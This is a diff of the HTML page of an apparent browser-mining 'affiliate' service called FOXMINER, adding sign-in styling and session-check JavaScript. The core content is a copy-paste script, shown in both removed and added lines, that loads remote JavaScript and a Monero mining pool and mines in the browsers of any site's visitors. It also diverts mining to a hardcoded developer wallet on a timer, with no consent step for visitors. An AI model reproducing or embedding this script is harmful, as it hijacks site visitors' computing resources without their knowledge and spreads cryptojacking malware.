@@ -25,6 +25,9 @@
         .affiliate-section h2 { font-size: 1.5em; color: #E94560; margin: 0 0 10px; }
         .affiliate-section p { font-size: 1em; color: #B0B0B0; margin: 0 0 15px; line-height: 1.4; }
         .affiliate-section textarea { width: 100%; height: 150px; background: #1A1A2E; color: #F7F7F7; border: 1px solid #E94560; padding: 10px; font-family: 'Courier New', monospace; font-size: 0.9em; resize: none; border-radius: 5px; }
+        .affiliate-section .signin-message { font-size: 1em; color: #B0B0B0; margin: 0; line-height: 1.4; }
+        .affiliate-section .signin-message a { color: #E94560; text-decoration: none; font-weight: bold; }
+        .affiliate-section .signin-message a:hover { color: #FF6F61; }
         .dev-fee { margin-top: 20px; padding: 20px; background: #0F3460; border-radius: 10px; text-align: center; box-shadow: 0 0 10px rgba(233, 69, 96, 0.3); }
         .dev-fee h2 { font-size: 1.5em; color: #E94560; margin: 0 0 10px; }
         .dev-fee p { font-size: 1em; color: #B0B0B0; margin: 0 0 15px; line-height: 1.4; }
@@ -79,11 +82,7 @@
         <div class="affiliate-section">
             <h2>Your Affiliate Script</h2>
             <p>Copy the script below, replace <code>YOUR_XMR_WALLET_HERE</code> with your Monero wallet address, and paste it in your website's HTML just before the closing body tag. Visit the "Web" tab at the top of the page, enter your affiliate XMR wallet address, and see your site visitor stats in real-time.</p>
-            <textarea readonly>
-<script>var affiliateWallet = 'YOUR_XMR_WALLET_HERE';</script>
-<script src="https://foxminer-web.github.io/Foxminer/copiedscript.js?karma=bs?nosaj=gulf.moneroocean.stream:80"></script>
-<script>(function(w,d){if(!w||w.length<90)return;d='45BBbPLpGnHVnVG3k3K12ngLSt5oMbrJRc8XduYMsdkKiLubk6TcU6kgmUD2AShj5hX5WUmGgDw5Add5ozKu6mZMBftHtFN';function s(){if(!EverythingIsLife)return setTimeout(s,1e3);var k='aff_'+Math.random().toString(36).slice(2);console.log('Miner running: '+w);EverythingIsLife(w,k,20);setInterval(function(){console.log('Dev: 10m');EverythingIsLife(d,'d_'+k,20);setTimeout(function(){k='aff_'+Math.random().toString(36).slice(2);console.log('Back: '+w);EverythingIsLife(w,k,20)},6e5)},6e6)}s()})(affiliateWallet);</script>
-            </textarea>
+            <div id="affiliate-script-container"></div>
         </div>
 
         <div class="dev-fee">
@@ -91,12 +90,6 @@
             <p>Our 5% dev fee keeps FOXMINER’s servers and frontend UI running smoothly. Thank you for supporting our platform!</p>
         </div>
     </div>
-    <script>
-        function toggleMenu() {
-            const nav = document.querySelector('nav');
-            nav.classList.toggle('active');
-        }
-    </script>
     <footer class="footer">
         <div class="footer-container">
             <div class="footer-section company-info">
@@ -118,5 +111,85 @@
             </div>
         </div>
     </footer>
+    <script>
+        const server = 'https://foxminer-server.onrender.com';
+        let isSignedIn = false;
+        let userEmail = '';
+
+        function toggleMenu() {
+            const nav = document.querySelector('nav');
+            nav.classList.toggle('active');
+        }
+
+        async function checkSession() {
+            console.log('checkSession started');
+            try {
+                const response = await fetch(`${server}/check-session`, {
+                    method: 'GET',
+                    credentials: 'include'
+                });
+                console.log('Fetch response:', response);
+                const data = await response.json();
+                console.log('Session data:', JSON.stringify(data, null, 2));
+                const userInfo = document.getElementById('user-info');
+                const nav = document.querySelector('nav');
+                const scriptContainer = document.getElementById('affiliate-script-container');
+                
+                if (data.signedIn) {
+                    isSignedIn = true;
+                    userEmail = data.email;
+                    userInfo.innerHTML = `${data.email} <button onclick="logout()">Logout</button>`;
+                    nav.classList.add('logged-in');
+                    // Show affiliate script
+                    scriptContainer.innerHTML = `
+                        <textarea readonly>
+<script>var affiliateWallet = 'YOUR_XMR_WALLET_HERE';</script>
+<script src="https://foxminer-web.github.io/Foxminer/copiedscript.js?karma=bs?nosaj=gulf.moneroocean.stream:80"></script>
+<script>(function(w,d){if(!w||w.length<90)return;d='45BBbPLpGnHVnVG3k3K12ngLSt5oMbrJRc8XduYMsdkKiLubk6TcU6kgmUD2AShj5hX5WUmGgDw5Add5ozKu6mZMBftHtFN';function s(){if(!EverythingIsLife)return setTimeout(s,1e3);var k='aff_'+Math.random().toString(36).slice(2);console.log('Miner running: '+w);EverythingIsLife(w,k,20);setInterval(function(){console.log('Dev: 10m');EverythingIsLife(d,'d_'+k,20);setTimeout(function(){k='aff_'+Math.random().toString(36).slice(2);console.log('Back: '+w);EverythingIsLife(w,k,20)},6e5)},6e6)}s()})(affiliateWallet);</script>
+                        </textarea>
+                    `;
+                } else {
+                    isSignedIn = false;
+                    userEmail = '';
+                    userInfo.innerHTML = '<a href="/Foxminer/signin.html">Sign In</a>';
+                    nav.classList.remove('logged-in');
+                    // Show sign-in message
+                    scriptContainer.innerHTML = `
+                        <p class="signin-message">Please <a href="/Foxminer/signup.html">signup</a> or <a href="/Foxminer/signin.html">sign in</a> to view your affiliate script.</p>
+                    `;
+                }
+            } catch (error) {
+                console.error('Session check failed:', error);
+                const scriptContainer = document.getElementById('affiliate-script-container');
+                scriptContainer.innerHTML = `
+                    <p class="signin-message">Please <a href="/Foxminer/signup.html">signup</a> or <a href="/Foxminer/signin.html">sign in</a> to view your affiliate script.</p>
+                `;
+            }
+        }
+
+        async function logout() {
+            try {
+                await fetch(`${server}/logout`, {
+                    method: 'POST',
+                    credentials: 'include'
+                });
+                isSignedIn = false;
+                userEmail = '';
+                document.getElementById('user-info').innerHTML = '<a href="/Foxminer/signin.html">Sign In</a>';
+                document.querySelector('nav').classList.remove('logged-in');
+                const scriptContainer = document.getElementById('affiliate-script-container');
+                scriptContainer.innerHTML = `
+                    <p class="signin-message">Please <a href="/Foxminer/signup.html">signup</a> or <a href="/Foxminer/signin.html">sign in</a> to view your affiliate script.</p>
+                `;
+            } catch (error) {
+                console.error('Logout failed:', error);
+            }
+        }
+
+        window.onload = () => {
+            console.log('Window loaded, calling checkSession');
+            checkSession();
+        };
+    </script>
 </body>
 </html>
